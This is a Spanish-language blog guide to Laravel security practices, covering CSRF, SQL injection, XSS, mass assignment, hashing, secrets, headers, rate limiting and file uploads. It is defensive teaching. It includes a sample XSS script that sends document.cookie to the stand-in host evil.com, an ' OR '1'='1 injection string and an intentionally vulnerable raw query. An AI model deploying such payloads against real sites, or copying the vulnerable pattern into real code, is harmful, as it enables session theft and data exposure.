---
title: 'Buenas prácticas de seguridad en Laravel — Guía completa'
description: 'Protege tu aplicación Laravel: SQL injection, XSS, CSRF, autenticación segura, variables de entorno, headers de seguridad y las mejores prácticas de 2024.'
pubDate: '2024-04-20'
tags: ['laravel', 'seguridad', 'buenas-practicas', 'produccion']
---

La seguridad no es algo que se añade al final del proyecto, es algo que se construye desde el principio. Laravel incluye muchas protecciones de seguridad activadas por defecto, pero como desarrollador debes entender qué protecciones existen, cuáles son tus responsabilidades y qué errores comunes pueden dejarte expuesto aunque uses un framework moderno.

Este artículo cubre las vulnerabilidades más comunes en aplicaciones web y cómo Laravel las maneja, junto con las prácticas que tú debes seguir para complementar esas protecciones.

## Protección CSRF — Ya incluida, pero debes entenderla

CSRF (Cross-Site Request Forgery) es un ataque donde una página maliciosa hace que el navegador del usuario envíe un request a tu aplicación sin que el usuario lo sepa ni lo quiera.

Laravel protege contra esto automáticamente con el middleware `VerifyCsrfToken` que está activo en todas las rutas `web.php`. Este middleware verifica que cada request POST, PUT, PATCH o DELETE incluya un token CSRF válido que solo tu aplicación conoce.

```php
// En tus formularios Blade, siempre incluye el token:
<form method="POST" action="/posts">
    @csrf  {{-- genera: <input type="hidden" name="_token" value="..."> --}}
    <!-- campos del formulario -->
</form>
```

Si usas Axios o Fetch para requests AJAX, Laravel incluye el token en la cookie `XSRF-TOKEN` que Axios lee automáticamente. Para Fetch manual necesitas incluirlo:

```php
// En el head de tu layout
<meta name="csrf-token" content="{{ csrf_token() }}">
```

```php
// En JavaScript
const response = await fetch('/api/posts', {
    method: 'POST',
    headers: {
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
});
```

Si tienes rutas que deben excluirse de la verificación CSRF (webhooks de terceros, por ejemplo), añádelas en `app/Http/Middleware/VerifyCsrfToken.php`:

```php
protected $except = [
    'stripe/webhook',
    'paypal/notification',
];
```

Pero nunca excluyas rutas que manejen acciones del usuario.

## SQL Injection — Nunca uses raw con input del usuario

La SQL injection ocurre cuando input del usuario se interpola directamente en una query SQL, permitiendo que un atacante modifique la query para robar datos o destruir la base de datos.

Laravel's Query Builder y Eloquent usan prepared statements automáticamente, lo que previene SQL injection en el 99% de los casos:

```php
// SEGURO: Laravel usa bindings automáticamente
$user = User::where('email', $request->email)->first();

// También seguro
$posts = DB::table('posts')->where('user_id', $userId)->get();
```

El problema surge cuando usas `DB::raw()` o `whereRaw()` con input del usuario sin sanitizar:

```php
// PELIGROSO — nunca hagas esto
$posts = DB::select("SELECT * FROM posts WHERE title = '{$request->title}'");

// Si el usuario envía: ' OR '1'='1
// La query se convierte en: SELECT * FROM posts WHERE title = '' OR '1'='1'
// Resultado: devuelve TODOS los posts

// SEGURO — usa bindings
$posts = DB::select("SELECT * FROM posts WHERE title = ?", [$request->title]);

// O con named bindings
$posts = DB::select(
    "SELECT * FROM posts WHERE title = :title AND published = :published",
    ['title' => $request->title, 'published' => true]
);

// También con whereRaw
$posts = Post::whereRaw('YEAR(created_at) = ?', [$request->year])->get();
```

La regla es simple: **nunca interpoles variables directamente en queries SQL**. Siempre usa los métodos de Eloquent o los bindings de `DB::raw()`.

## XSS — Conoce la diferencia entre `{{ }}` y `{!! !!}`

XSS (Cross-Site Scripting) ocurre cuando contenido malicioso del usuario se renderiza como HTML en el navegador, permitiendo ejecutar JavaScript en el contexto de otros usuarios.

Blade escapa automáticamente el contenido con `{{ }}`:

```php
// SEGURO: Blade escapa el HTML automáticamente
<h1>{{ $post->title }}</h1>
// Si $post->title = '<script>alert("XSS")</script>'
// Renderiza: &lt;script&gt;alert("XSS")&lt;/script&gt;
// El navegador lo muestra como texto, no lo ejecuta
```

El peligro está en `{!! !!}` que renderiza HTML sin escapar:

```php
// PELIGROSO si $post->content viene del usuario sin sanitizar
{!! $post->content !!}

// Si el usuario guardó: <script>document.cookie = document.cookie; fetch('https://evil.com/?' + document.cookie)</script>
// Ese script se ejecutará en el navegador de todos los que lean el post
```

¿Cuándo usar `{!! !!}`? Solo cuando el HTML viene de una fuente de confianza que no puede ser manipulada por usuarios no privilegiados, como contenido generado por ti mismo o sanitizado antes de guardarse:

```php
// En el controlador, sanitiza antes de guardar
use Illuminate\Support\Str;

public function store(Request $request)
{
    $content = strip_tags($request->content, '<p><strong><em><ul><ol><li><a><h2><h3>');
    // O usando una librería como HTMLPurifier para una sanitización más completa
    Post::create([
        'content' => $content,
        // ...
    ]);
}
```

Si necesitas un editor WYSIWYG donde los usuarios puedan escribir HTML con formato, usa una librería de sanitización como `mews/purifier`:

```php
composer require mews/purifier
```

```php
$content = clean($request->content); // sanitiza el HTML automáticamente
```

## Mass Assignment — Protección con `$fillable`

Mass assignment es una vulnerabilidad donde un usuario puede enviar campos adicionales en un request que no deberían ser editables, como `is_admin` o `role`.

```php
// PELIGROSO
public function store(Request $request)
{
    User::create($request->all()); // ¿qué pasa si el usuario envía is_admin=true?
}
```

Laravel protege contra esto con la propiedad `$fillable` o `$guarded` en los modelos:

```php
class User extends Authenticatable
{
    // Solo estos campos pueden asignarse masivamente
    protected $fillable = [
        'name',
        'email',
        'password',
    ];

    // Alternativa: proteger campos específicos (el resto se puede asignar)
    // protected $guarded = ['id', 'is_admin', 'role'];
}
```

Con `$fillable` definido, aunque el usuario envíe `is_admin=1` en el request, Eloquent simplemente lo ignorará al hacer `User::create()` o `$user->fill()`.

La mejor práctica es usar siempre `$request->validated()` en lugar de `$request->all()`:

```php
public function store(Request $request)
{
    $validated = $request->validate([
        'name' => 'required|string|max:255',
        'email' => 'required|email|unique:users',
        'password' => 'required|min:8|confirmed',
    ]);

    // $validated solo contiene los campos que pasaron la validación
    User::create($validated);
}
```

## Autenticación segura — Nunca almacenes contraseñas en texto plano

Laravel usa `bcrypt` por defecto para hashear contraseñas, y la facade `Hash` maneja todo esto automáticamente:

```php
use Illuminate\Support\Facades\Hash;

// Al crear un usuario (Laravel Breeze/Jetstream ya hace esto)
User::create([
    'name' => $request->name,
    'email' => $request->email,
    'password' => Hash::make($request->password), // hashea automáticamente
]);

// Al verificar una contraseña en login manual
if (Hash::check($request->password, $user->password)) {
    // contraseña correcta
}
```

Si usas la mutator en el modelo de User, el hash se aplica automáticamente:

```php
// En el modelo User (Laravel lo incluye por defecto en versiones recientes)
protected function password(): Attribute
{
    return Attribute::make(
        set: fn (string $value) => Hash::make($value),
    );
}
```

**Nunca** guardes contraseñas en texto plano, ni las encriptes (que se puede revertir). El hash con bcrypt es unidireccional: si la base de datos se filtra, las contraseñas no se pueden recuperar directamente.

## Variables de entorno — Secretos fuera del código

Nunca hardcodees credenciales, claves API o secretos directamente en el código:

```php
// MAL — nunca hagas esto (API key hardcodeada en el código)
$stripe = new \Stripe\Stripe('CLAVE_API_SECRETA_HARDCODEADA'); // ❌ peligroso

// BIEN — usa variables de entorno
$stripe = new \Stripe\Stripe(config('services.stripe.secret'));
// En config/services.php: 'stripe' => ['secret' => env('STRIPE_SECRET_KEY')]
// En .env: STRIPE_SECRET_KEY=tu_clave_real_aqui (nunca en el repositorio)
```

El archivo `.env` nunca debe estar en el repositorio. Verifica que está en `.gitignore`:

```php
# .gitignore
.env
.env.backup
.env.production
```

En producción, configura las variables de entorno directamente en el servidor o usa un gestor de secretos como AWS Secrets Manager, HashiCorp Vault o las variables de entorno del panel de tu hosting.

## `APP_DEBUG=false` en producción

Con `APP_DEBUG=true`, cuando ocurre un error Laravel muestra el stack trace completo, las variables de entorno, la configuración de la base de datos y muchos otros detalles sensibles. Esto es perfectamente útil en desarrollo, pero en producción es una vulnerabilidad grave.

```php
# .env en producción
APP_DEBUG=false
APP_ENV=production
```

Con `APP_DEBUG=false`, los errores muestran una página genérica al usuario sin revelar información sensible. Los errores se registran en `storage/logs/laravel.log` para que puedas revisarlos sin que los usuarios los vean.

## Headers de seguridad HTTP

Los browsers modernos soportan varios headers HTTP de seguridad que le dicen al navegador cómo comportarse con tu sitio. Laravel no los añade por defecto, pero puedes crearlos con un middleware:

```php
php artisan make:middleware SecurityHeaders
```

```php
// app/Http/Middleware/SecurityHeaders.php
class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        // Previene que el navegador adivine el tipo de contenido
        $response->headers->set('X-Content-Type-Options', 'nosniff');

        // Protección básica contra XSS en browsers antiguos
        $response->headers->set('X-XSS-Protection', '1; mode=block');

        // Previene que tu sitio sea embebido en iframes (protección contra clickjacking)
        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');

        // Fuerza HTTPS
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

        // Define qué recursos puede cargar tu sitio (Content Security Policy)
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');

        return $response;
    }
}
```

Registra el middleware en `app/Http/Kernel.php` en el grupo `web`:

```php
protected $middlewareGroups = [
    'web' => [
        // ... otros middlewares
        \App\Http\Middleware\SecurityHeaders::class,
    ],
];
```

## Rate Limiting — Protección contra fuerza bruta

El rate limiting limita cuántos requests puede hacer un usuario en un período de tiempo. Laravel incluye el middleware `throttle` que puedes aplicar fácilmente:

```php
// routes/web.php — limitar el formulario de login
Route::post('/login', [LoginController::class, 'store'])
    ->middleware('throttle:5,1'); // máximo 5 intentos por minuto

// routes/api.php — la protección por defecto para APIs
Route::middleware(['auth:sanctum', 'throttle:60,1'])->group(function () {
    // máximo 60 requests por minuto para usuarios autenticados
    Route::get('/user', [UserController::class, 'show']);
});
```

Puedes crear limitadores personalizados en `app/Providers/RouteServiceProvider.php`:

```php
protected function configureRateLimiting(): void
{
    // Limitar por IP para el login
    RateLimiter::for('login', function (Request $request) {
        return Limit::perMinute(5)->by($request->ip());
    });

    // Limitar por usuario para la API
    RateLimiter::for('api', function (Request $request) {
        return $request->user()
            ? Limit::perMinute(120)->by($request->user()->id)
            : Limit::perMinute(20)->by($request->ip());
    });
}
```

## Validación de archivos subidos

Nunca confíes en los archivos que suben los usuarios. Un archivo "imagen" podría ser en realidad un script PHP. Siempre valida:

```php
public function uploadAvatar(Request $request)
{
    $request->validate([
        'avatar' => [
            'required',
            'file',
            'image',                    // verifica que sea una imagen real
            'mimes:jpeg,png,gif,webp',  // extensiones permitidas
            'max:2048',                 // máximo 2MB (en kilobytes)
            'dimensions:max_width=2000,max_height=2000', // dimensiones máximas
        ],
    ]);

    // Guarda fuera del directorio public para que no sea accesible directamente
    $path = $request->file('avatar')->store('avatars', 'local');

    // Genera una URL firmada temporal si necesitas mostrar el archivo
    $url = Storage::temporaryUrl($path, now()->addMinutes(5));
}
```

Nunca guardes archivos subidos por usuarios dentro de `public/` directamente. Usa `Storage::disk('local')` y sirve los archivos a través de un controlador que verifique permisos.

## Mantener paquetes actualizados

Las vulnerabilidades de seguridad en paquetes de terceros son una fuente común de problemas. Laravel incluye integración con el advisory database de PHP:

```php
# Auditar dependencias en busca de vulnerabilidades conocidas
composer audit

# Actualizar paquetes con parches de seguridad
composer update --prefer-stable
```

Ejecuta `composer audit` regularmente en tu CI/CD pipeline. Te avisa si alguna de tus dependencias tiene vulnerabilidades de seguridad conocidas.

## Resumen de protecciones built-in de Laravel

Para cerrar, aquí un resumen de todo lo que Laravel hace por ti automáticamente:

| Vulnerabilidad | Protección de Laravel |
|---|---|
| CSRF | Middleware `VerifyCsrfToken` activo por defecto |
| SQL Injection | Prepared statements en Query Builder y Eloquent |
| XSS | Escape automático en `{{ }}` de Blade |
| Mass Assignment | `$fillable` / `$guarded` en modelos |
| Contraseñas | Hash con bcrypt via `Hash::make()` |
| Sesiones | Encriptadas y firmadas |
| Cookies | Firmadas y encriptadas con `EncryptCookies` middleware |

Y lo que tú debes hacer manualmente:

- `APP_DEBUG=false` en producción
- Secretos en `.env`, nunca en código
- Validar y sanitizar archivos subidos
- Añadir security headers con un middleware
- Rate limiting en rutas sensibles
- Actualizar paquetes regularmente con `composer audit`
- Usar `$request->validated()` en lugar de `$request->all()`

## Conclusión

La seguridad en Laravel es una responsabilidad compartida: el framework hace mucho trabajo pesado por ti, pero hay una serie de prácticas que debes seguir de forma consciente. La buena noticia es que si construyes tus aplicaciones siguiendo las convenciones de Laravel (Eloquent en lugar de SQL manual, Blade en lugar de PHP en las vistas, validación de requests), ya estás protegiéndote contra la mayoría de las vulnerabilidades más comunes de forma automática.

El paso adicional es conocer estas protecciones, entender por qué existen y no hacer cosas que las bypaseen por desconocimiento. Con eso, tu aplicación Laravel estará mucho más segura que el promedio.
